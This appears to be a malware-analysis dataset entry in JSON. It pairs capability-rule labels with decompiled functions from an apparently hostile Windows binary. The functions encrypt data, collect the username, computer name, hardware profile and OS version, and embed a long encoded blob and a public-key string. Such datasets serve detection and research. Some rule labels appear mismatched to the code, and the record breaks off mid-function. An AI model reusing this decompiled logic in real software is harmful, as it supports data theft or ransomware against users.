{
    "00401000": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401000(int32_t param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uchar *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    // [00] -r-x section size 65536 named .text\n    puVar8 = param_2 + 3;\n    puVar1 = param_1 + 1;\n    var_24h = 4;\n    puVar3 = puVar1;\n    do {\n        puVar3[-1] = puVar8[-3];\n        *puVar3 = puVar3[param_2 - param_1];\n        puVar3[1] = puVar8[-1];\n        puVar3[2] = *puVar8;\n        puVar8 = puVar8 + 4;\n        puVar3 = puVar3 + 4;\n        var_24h = var_24h + -1;\n    } while (var_24h != 0);\n    var_ch = 4;\n    iVar2 = param_1 + 3;\n    puVar10 = param_1 + 0x13;\n    puVar4 = param_1 + 0xd;\n    puVar9 = param_1 + 2;\n    do {\n        uVar7 = puVar4[param_1 - puVar1];\n        uVar5 = *puVar4;\n        var_8h._3_1_ = puVar4[iVar2 - puVar1];\n        var_8h._2_1_ = puVar4[(param_1 + 2) - puVar1];\n        if ((var_ch & 3) == 0) {\n            var_8h._2_1_ = str.cw[var_8h._3_1_];\n            uVar6 = uVar5;\n            uVar5 = str.cw[puVar4[(param_1 + 2) - puVar1]];\n            var_8h._3_1_ = str.cw[uVar7];\n            uVar7 = str.cw[uVar6] ^ *((var_ch >> 2) + 0x413390);\n        }\n        puVar10[param_1 - iVar2] = puVar9[param_1 - (param_1 + 2)] ^ uVar7;\n        puVar4[4] = puVar4[-0xc] ^ uVar5;\n        puVar4 = puVar4 + 4;\n        puVar9[0x10] = *puVar9 ^ var_8h._2_1_;\n        var_ch = var_ch + 1;\n        *puVar10 = puVar9[iVar2 - (param_1 + 2)] ^ var_8h._3_1_;\n        puVar9 = puVar9 + 4;\n        puVar10 = puVar10 + 4;\n    } while (var_ch < 0x2c);\n    return;\n}\n",
        "token_count": 788
    },
    "004011ac": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __fastcall fcn.004011ac(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint var_3h;\n    \n    iVar6 = 4;\n    puVar4 = param_1 + 2;\n    do {\n        uVar2 = puVar4[1] ^ *puVar4;\n        uVar1 = puVar4[-2];\n        uVar3 = uVar2 ^ uVar1 ^ puVar4[-1];\n        uVar5 = uVar1 ^ puVar4[-1];\n        puVar4[-2] = (uVar5 >> 7) * -0x1b ^ uVar5 * '\\x02' ^ uVar1 ^ uVar3;\n        puVar4[-1] = ((puVar4[-1] ^ *puVar4) >> 7) * -0x1b ^ (puVar4[-1] ^ *puVar4) * '\\x02' ^ puVar4[-1] ^ uVar3;\n        *puVar4 = (uVar2 >> 7) * -0x1b ^ uVar2 * '\\x02' ^ *puVar4 ^ uVar3;\n        iVar6 = iVar6 + -1;\n        puVar4[1] = ((puVar4[1] ^ uVar1) >> 7) * -0x1b ^ (puVar4[1] ^ uVar1) * '\\x02' ^ puVar4[1] ^ uVar3;\n        puVar4 = puVar4 + 4;\n    } while (iVar6 != 0);\n    return;\n}\n",
        "token_count": 411
    },
    "0040123a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040123a(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    int32_t iVar4;\n    \n    fcn.0040111d(arg_8h);\n    uVar2 = 1;\n    do {\n        fcn.00401141();\n        fcn.00401163();\n        fcn.004011ac();\n        fcn.0040111d(arg_8h);\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 10);\n    fcn.00401141();\n    fcn.00401163();\n    puVar1 = arg_8h + 0xa0;\n    iVar4 = 4;\n    do {\n        iVar3 = 4;\n        do {\n            *unaff_ESI = *unaff_ESI ^ *puVar1;\n            puVar1 = puVar1 + 1;\n            unaff_ESI = unaff_ESI + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return;\n}\n",
        "token_count": 285
    },
    "004054aa": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.004054aa(void)\n\n{\n    int16_t iVar1;\n    uint arg_8h;\n    char *pcVar2;\n    int32_t lplpBuffer;\n    uint puLen;\n    uint lpdwHandle;\n    \n    lpdwHandle = (*_sym.imp.VERSION.dll_GetFileVersionInfoSizeA)(\"kernel32.dll\", &lpdwHandle);\n    arg_8h = fcn.004083ed(lpdwHandle);\n    (*_sym.imp.VERSION.dll_GetFileVersionInfoA)(\"kernel32.dll\", 0, lpdwHandle, arg_8h);\n    puLen = 0;\n    (*_sym.imp.VERSION.dll_VerQueryValueA)(arg_8h, 0x413bc4, &lplpBuffer, &puLen);\n    iVar1 = *(lplpBuffer + 8);\n    if (*(lplpBuffer + 10) == 6) {\n        if (iVar1 == 1) {\n            pcVar2 = \"Windows 7\";\n            goto code_r0x0040553a;\n        }\n        if (iVar1 == 2) {\n            pcVar2 = \"Windows 8\";\n            goto code_r0x0040553a;\n        }\n        if (iVar1 == 3) {\n            pcVar2 = \"Windows 8.1\";\n            goto code_r0x0040553a;\n        }\n    }\n    else if ((*(lplpBuffer + 10) == 10) && (pcVar2 = \"Windows 10\",  iVar1 == 0)) goto code_r0x0040553a;\n    pcVar2 = \"Windows XP\";\ncode_r0x0040553a:\n    fcn.0040a2c0(pcVar2);\n    fcn.00403be0();\n    fcn.0040a3ea(arg_8h);\n    return;\n}\n",
        "token_count": 405
    },
    "0040135c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040135c(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((arg_8h != '\\0') && (0xf < unaff_ESI[5])) {\n        arg_ch = *unaff_ESI;\n        if (unaff_EDI != 0) {\n            fcn.00408410(unaff_ESI, arg_ch, unaff_EDI);\n        }\n        fcn.004088ab(arg_ch);\n    }\n    unaff_ESI[5] = 0xf;\n    unaff_ESI[4] = unaff_EDI;\n    *(unaff_EDI + unaff_ESI) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "00408920": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408920(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0040b12f(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 82
    },
    "004036a1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004036a1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t *unaff_EBX;\n    \n    puVar1 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar1 = *in_EAX;\n    }\n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else {\n        arg_8h = arg_8h - puVar1;\n    }\n    fcn.00403637();\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    *unaff_EBX = in_EAX + arg_8h;\n    return;\n}\n",
        "token_count": 181
    },
    "00403aec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403aec(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((arg_8h != '\\0') && (7 < unaff_ESI[5])) {\n        arg_ch = *unaff_ESI;\n        if (unaff_EDI != 0) {\n            fcn.00408410(unaff_ESI, arg_ch, unaff_EDI * 2);\n        }\n        fcn.004088ab(arg_ch);\n    }\n    unaff_ESI[5] = 7;\n    unaff_ESI[4] = unaff_EDI;\n    *(unaff_ESI + unaff_EDI * 2) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "00403dd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403dd0(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint32_t unaff_EBX;\n    \n    if (0x7ffffffe < unaff_EBX) {\n        fcn.00408332(\"string too long\");\n    }\n    if (in_EAX[5] < unaff_EBX) {\n        fcn.0040411f(in_EAX, unaff_EBX, in_EAX[4]);\n    }\n    else if ((arg_8h == '\\0') || (7 < unaff_EBX)) {\n        if (unaff_EBX == 0) {\n            in_EAX[4] = 0;\n            if (7 < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            *in_EAX = 0;\n        }\n    }\n    else {\n        fcn.00403aec(1);\n    }\n    return unaff_EBX != 0;\n}\n",
        "token_count": 213
    },
    "00403fff": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403fff(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040ec8c(0xc);\n    piVar1 = *(unaff_EBP + 8);\n    uVar7 = *(unaff_EBP + 0xc) | 0xf;\n    if (uVar7 == 0xffffffff) {\n        uVar7 = *(unaff_EBP + 0xc);\n    }\n    else {\n        uVar2 = piVar1[5];\n        *(unaff_EBP + -0x14) = uVar2;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar3 = *(unaff_EBP + -0x14);\n        if ((uVar7 / 3 < uVar3) && (uVar7 = 0xfffffffe,  uVar2 <= -uVar3 - 2)) {\n            uVar7 = uVar3 + uVar2;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00404292(uVar7 + 1);\n    *(unaff_EBP + -0x18) = uVar5;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        piVar6 = piVar1;\n        if (0xf < piVar1[5]) {\n            piVar6 = *piVar1;\n        }\n        fcn.00408410(*(unaff_EBP + -0x18), piVar6, *(unaff_EBP + 0x10));\n    }\n    fcn.0040135c(1);\n    piVar6 = *(unaff_EBP + -0x18);\n    *piVar1 = piVar6;\n    piVar1[5] = uVar7;\n    iVar4 = *(unaff_EBP + 0x10);\n    piVar1[4] = iVar4;\n    if (uVar7 < 0x10) {\n        piVar6 = piVar1;\n    }\n    *(piVar6 + iVar4) = 0;\n    fcn.0040ecc2();\n    return;\n}\n",
        "token_count": 612
    },
    "004040e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004040e4(uint *arg_8h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    \n    if (arg_8h != NULL) {\n        puVar1 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar1 = *in_EAX;\n        }\n        if (puVar1 <= arg_8h) {\n            puVar1 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                puVar1 = *in_EAX;\n            }\n            in_EAX = in_EAX[4] + puVar1;\n            if (arg_8h < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 189
    },
    "0040420d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040420d(uint *arg_8h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    \n    if (arg_8h != NULL) {\n        puVar1 = in_EAX;\n        if (7 < in_EAX[5]) {\n            puVar1 = *in_EAX;\n        }\n        if (puVar1 <= arg_8h) {\n            puVar1 = in_EAX;\n            if (7 < in_EAX[5]) {\n                puVar1 = *in_EAX;\n            }\n            in_EAX = puVar1 + in_EAX[4] * 2;\n            if (arg_8h < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 190
    },
    "004055ff": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004055ff(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *arg_8h_00;\n    char *arg_8h_01;\n    uint uVar3;\n    uint in_stack_fffffdc4;\n    char *arg_8h_02;\n    uint in_stack_fffffdc8;\n    uint in_stack_fffffdcc;\n    uint in_stack_fffffdd0;\n    uint in_stack_fffffdd4;\n    uint in_stack_fffffdd8;\n    uint arg_24h;\n    uint pcbBuffer;\n    uint lpHwProfileInfo;\n    uint var_1e0h;\n    uint var_160h;\n    uint var_144h;\n    uint var_128h;\n    uint lpBuffer;\n    uint32_t var_8h;\n    \n    var_8h = *0x416084 ^ &stack0xfffffffc;\n    fcn.004052ac();\n    fcn.004038f1();\n    fcn.0040135c(1);\n    cVar1 = fcn.004049c9(0x413b71);\n    if (cVar1 == '\\0') {\n        fcn.0040536d();\n        fcn.004038f1();\n        fcn.0040135c(1);\n        arg_24h = 0x4056a4;\n        fcn.00403597(\"DOCTYPE\");\n        uVar3 = 0x416ce0;\n        fcn.00403573(0x416ce0);\n        iVar2 = fcn.004081f8(uVar3, in_stack_fffffdc4, in_stack_fffffdc8, in_stack_fffffdcc, in_stack_fffffdd0, \n                             in_stack_fffffdd4, in_stack_fffffdd8, arg_24h);\n        if (iVar2 == 0) goto code_r0x004056d5;\n        fcn.0040a2c0(\"NONE\");\n    }\n    else {\n        fcn.0040a2c0(\"NONE\");\n        fcn.00403be0();\n        fcn.0040a2c0(\"NONE\");\n    }\n    fcn.00403be0();\ncode_r0x004056d5:\n    pcbBuffer = 0x100;\n    (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&fcn.004055ff::lpBuffer, &fcn.004055ff::pcbBuffer);\n    fcn.0040a2c0(&fcn.004055ff::lpBuffer);\n    fcn.00403be0();\n    pcbBuffer = 0x100;\n    (*_sym.imp.KERNEL32.dll_GetComputerNameA)(&fcn.004055ff::lpBuffer, &fcn.004055ff::pcbBuffer);\n    fcn.0040a2c0(&fcn.004055ff::lpBuffer);\n    fcn.00403be0();\n    fcn.004054aa();\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetCurrentHwProfileA)(&fcn.004055ff::lpHwProfileInfo);\n    if (iVar2 != 0) {\n        fcn.0040a2c0(&fcn.004055ff::var_1e0h);\n        fcn.00403be0();\n    }\n    fcn.00405558();\n    arg_8h_02 = \n    \"RncxzYIkLUjreE+uiaYheb+0nWSoOrQ4I/koo9RS/No5IiRaiSiEvN+HwzvL2EkjgDTRoaYOHk98oDepfbPsSRLFCJccXRWzJIyXmZkyObZMFQlDPP95e88Pd6OPPxtP3PAnrNzD2TUeA57w/59tPhvHhCdjWWFzz+GPGbStmOeTTfwmRj2bCcv0VxZ/SM/fbGH7+PG/YMjCaDAV6YtXhV04eK6hmaEX3IGFd8FuXleM6c3TNhXrJJgcn9vNd4lckxlAkUuu227FoEMyD0KGtDi+pYPqrGreaHeSWyH98OuznUI4BJv9suMTW7ObcjX3VkWfWBKCX9fHsBGDLFgMl2Qycm/RBo6PLju3D9JVJMFQgqHCk8Yv2UgClaCWiINMcXeaGLkp879sG0s7iJHjVAHXJ4nD82fdnXHOzSLe4sDumUTd5D5L5OyRggEOlTlcdHN80gvqOgSeeuhn58gzNvItb77us3s8LvjyGr8TZDtpSVrSqGbUwAyzvtAdTCHgk/O6U/jVZxUBln+kia/zxxOrMTZCVe4vkDTyhRE5qUJFWUteJAfp3BiQYXdDuwZzIDw7Y5JFG9CIT3T48XZkhrstz27DoJBX3HzYChQcDxRF53R3WCTHdSqpSOrrtpy6Ieg8NuyB1eF1vzuiQVw+iFKbBGqxMKQrXyVJc3QJnQWD6KD3+U5tELoPVkYxDWNSdxIZM5e+kkQUvkcQ57a+KvxGTIMf4lFxgZMmEbJm1inier1CZFUv8OrnUjKrjcLGCwgB+WKE+6Ydpue8L+0EK7Pt4NkZhcnpjkK9xZrhRNNOxMlXq+/g8NStZmwGZDqXbiBK64Nm9EjQJblMrJ+PRU8hNNmEAgPwNbU8THyLGgpPNhZkFGbdnSEmJHpFLF0ccuZ7SltD7pbZ9LCkruSQ4fEG/zkCSRZZv1O6jJvr8U1pXPSMOpzU/Im5yIS27csCWKqqDFgiyGhTqYunDb5eeeeFEtYWest4vW4bUsLZ3CeRoBGjRCvgf2Fu809Mkn2fpqyDppRn+epr28nkbJ+Yk1QLNGOf19AzEvLcVbrxCmqqLxIP5qHWr0qiYvwHrXCe81fc8zFBkmfn6jFksJlOe32Z1nbDQC9xOycc+lpRTKdhmC77CN8EZtw2Np+hQlhOfJLoJC5s440akbdM3DAQxTryfrj6Zal20twR9mRYlqwAO9iwyijjv9XPHCSu35jpC5E/rDU5xS9C7WiTAqCNko1hWtQaHYDX+6MRow9mvL0rK23wLuveCkifegBt8WgCphG+OoUpewXDG+k8r8Wk6KnLY1Jnu1mdVRBJg9wUzC92tv1kgqFaXN/5u3fAFhCk/zeW/cVFtEh3GgUCi336NBJP9wU6/MHZ5dd26kM9CFhmiONlK+q5LtRKSKLB61/92QfNVjlgpLYoC06poaueEWPbjYeFXuf6KWgT7WammU9/M+xRY0bbrc7rPXau8PyGn/MzKCWredSqZtF14862KqYE60DzuZEezesWmDySCN3egGVC8giK2EmYfRRqsFY/L7tJIuKuYzxAIrPjt2hR4BvEECuRIkIs5fuvp3C+vsYp3Gb9ZtNwCLKOHYWdDCZjkDKjCG6Obedc0xnfkeuTXemD1WY83ohZfgo32dNp5XMgOPVA1GfhA4v32tGKkCU52wHGOf0aB7nzw4Kolo5wfhjPK0qn4a0RVfQnTBwhgfTtFgqecbaKNnENVtjVM6eYpdUPsPg+axLB2o5xUrjMduB1Z6bgRlZ/pCfQG8m5eQKCJw+8rd5wcEYC4jCS475q58TpEVY+5LqY6erWZ+aN+TdmioMqmefC1+K+knXyCRIb/thhqmO/bkvZXz/G5j45\"\n    ;\n    fcn.00403597(\n                \"RncxzYIkLUjreE+uiaYheb+0nWSoOrQ4I/koo9RS/No5IiRaiSiEvN+HwzvL2EkjgDTRoaYOHk98oDepfbPsSRLFCJccXRWzJIyXmZkyObZMFQlDPP95e88Pd6OPPxtP3PAnrNzD2TUeA57w/59tPhvHhCdjWWFzz+GPGbStmOeTTfwmRj2bCcv0VxZ/SM/fbGH7+PG/YMjCaDAV6YtXhV04eK6hmaEX3IGFd8FuXleM6c3TNhXrJJgcn9vNd4lckxlAkUuu227FoEMyD0KGtDi+pYPqrGreaHeSWyH98OuznUI4BJv9suMTW7ObcjX3VkWfWBKCX9fHsBGDLFgMl2Qycm/RBo6PLju3D9JVJMFQgqHCk8Yv2UgClaCWiINMcXeaGLkp879sG0s7iJHjVAHXJ4nD82fdnXHOzSLe4sDumUTd5D5L5OyRggEOlTlcdHN80gvqOgSeeuhn58gzNvItb77us3s8LvjyGr8TZDtpSVrSqGbUwAyzvtAdTCHgk/O6U/jVZxUBln+kia/zxxOrMTZCVe4vkDTyhRE5qUJFWUteJAfp3BiQYXdDuwZzIDw7Y5JFG9CIT3T48XZkhrstz27DoJBX3HzYChQcDxRF53R3WCTHdSqpSOrrtpy6Ieg8NuyB1eF1vzuiQVw+iFKbBGqxMKQrXyVJc3QJnQWD6KD3+U5tELoPVkYxDWNSdxIZM5e+kkQUvkcQ57a+KvxGTIMf4lFxgZMmEbJm1inier1CZFUv8OrnUjKrjcLGCwgB+WKE+6Ydpue8L+0EK7Pt4NkZhcnpjkK9xZrhRNNOxMlXq+/g8NStZmwGZDqXbiBK64Nm9EjQJblMrJ+PRU8hNNmEAgPwNbU8THyLGgpPNhZkFGbdnSEmJHpFLF0ccuZ7SltD7pbZ9LCkruSQ4fEG/zkCSRZZv1O6jJvr8U1pXPSMOpzU/Im5yIS27csCWKqqDFgiyGhTqYunDb5eeeeFEtYWest4vW4bUsLZ3CeRoBGjRCvgf2Fu809Mkn2fpqyDppRn+epr28nkbJ+Yk1QLNGOf19AzEvLcVbrxCmqqLxIP5qHWr0qiYvwHrXCe81fc8zFBkmfn6jFksJlOe32Z1nbDQC9xOycc+lpRTKdhmC77CN8EZtw2Np+hQlhOfJLoJC5s440akbdM3DAQxTryfrj6Zal20twR9mRYlqwAO9iwyijjv9XPHCSu35jpC5E/rDU5xS9C7WiTAqCNko1hWtQaHYDX+6MRow9mvL0rK23wLuveCkifegBt8WgCphG+OoUpewXDG+k8r8Wk6KnLY1Jnu1mdVRBJg9wUzC92tv1kgqFaXN/5u3fAFhCk/zeW/cVFtEh3GgUCi336NBJP9wU6/MHZ5dd26kM9CFhmiONlK+q5LtRKSKLB61/92QfNVjlgpLYoC06poaueEWPbjYeFXuf6KWgT7WammU9/M+xRY0bbrc7rPXau8PyGn/MzKCWredSqZtF14862KqYE60DzuZEezesWmDySCN3egGVC8giK2EmYfRRqsFY/L7tJIuKuYzxAIrPjt2hR4BvEECuRIkIs5fuvp3C+vsYp3Gb9ZtNwCLKOHYWdDCZjkDKjCG6Obedc0xnfkeuTXemD1WY83ohZfgo32dNp5XMgOPVA1GfhA4v32tGKkCU52wHGOf0aB7nzw4Kolo5wfhjPK0qn4a0RVfQnTBwhgfTtFgqecbaKNnENVtjVM6eYpdUPsPg+axLB2o5xUrjMduB1Z6bgRlZ/pCfQG8m5eQKCJw+8rd5wcEYC4jCS475q58TpEVY+5LqY6erWZ+aN+TdmioMqmefC1+K+knXyCRIb/thhqmO/bkvZXz/G5j45\"\n                );\n    uVar3 = 0x40579a;\n    fcn.00407d97(arg_8h_02, in_stack_fffffdc8, in_stack_fffffdcc, in_stack_fffffdd0, in_stack_fffffdd4, \n                 in_stack_fffffdd8);\n    fcn.004038f1();\n    fcn.0040135c(1);\n    if (arg_8h != '\\0') {\n        arg_8h_01 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";\n        fcn.00403597(\"ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\");\n        fcn.00408062(arg_8h_01, uVar3, arg_8h_02, in_stack_fffffdc8, in_stack_fffffdcc);\n        arg_8h_00 = \"SlU12Jo6\";\n        fcn.00403597(\"SlU12Jo6\");\n        fcn.00407d97(arg_8h_00, arg_8h_01, uVar3, arg_8h_02, in_stack_fffffdc8, in_stack_fffffdcc);\n        fcn.004043e8();\n        fcn.004038f1();\n        fcn.0040135c(1);\n        fcn.0040135c(1);\n        fcn.0040135c(1);\n    }\n    fcn.004083f8(in_stack_fffffdd4);\n    return;\n}\n",
        "token_count": 3695
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407037)\n// WARNING: Removing unreachable block (ram,0x0040701e)\n// WARNING: Removing unreachable block (ram,0x00407050)\n\nvoid __cdecl main(int32_t argv, uint envp)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint in_stack_fffffe64;\n    uint in_stack_fffffe68;\n    uint in_stack_fffffe6c;\n    uint in_stack_fffffe70;\n    uint in_stack_fffffe74;\n    uint in_stack_fffffe78;\n    uint in_stack_fffffe80;\n    uchar *arg_8h;\n    uint in_stack_fffffe84;\n    uint in_stack_fffffe88;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    char *pcVar5;\n    uint uVar6;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint arg_24h;\n    uint in_stack_fffffec8;\n    uint noname_8;\n    uint in_stack_fffffecc;\n    uint arg_24h_00;\n    uint in_stack_fffffed0;\n    uint noname_8_00;\n    uint arg_24h_01;\n    uint noname_8_01;\n    char *arg_8h_00;\n    uint uVar7;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint uVar8;\n    uint uVar9;\n    uint in_stack_fffffefc;\n    uint uStack244;\n    uint uStack240;\n    char *pcStack236;\n    uchar auStack220 [4];\n    uint uStack216;\n    uint uStack212;\n    uchar auStack172 [16];\n    uchar auStack156 [144];\n    uint32_t uStack12;\n    \n    uStack12 = *0x416084 ^ &stack0xffffff24;\n    pcStack236 = \"Vremya tik-tak... Odinochestvo moi simvol...\";\n    uStack240 = 0;\n    uStack244 = 0;\n    uStack212 = envp;\n    uStack216 = 0;\n    (*_sym.imp.KERNEL32.dll_CreateMutexA)();\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar4 == 0xb7) {\n        in_stack_fffffefc = 0x406f71;\n        (*_sym.imp.KERNEL32.dll_ExitProcess)();\n    }\n    uVar7 = 0x4145ac;\n    pcStack236 = 0x1;\n    fcn.00403597(0x4145ac);\n    arg_8h_00 = 0x406f9a;\n    fcn.00406990(uVar7, in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec, in_stack_fffffef0, in_stack_fffffef4);\n    uVar9 = 0x406fa4;\n    cVar3 = fcn.004049c9(in_stack_fffffefc);\n    if (cVar3 != '\\0') {\n        arg_8h_00 = \"pbkey\";\n        uStack240 = 3;\n        fcn.00403597(\"pbkey\");\n        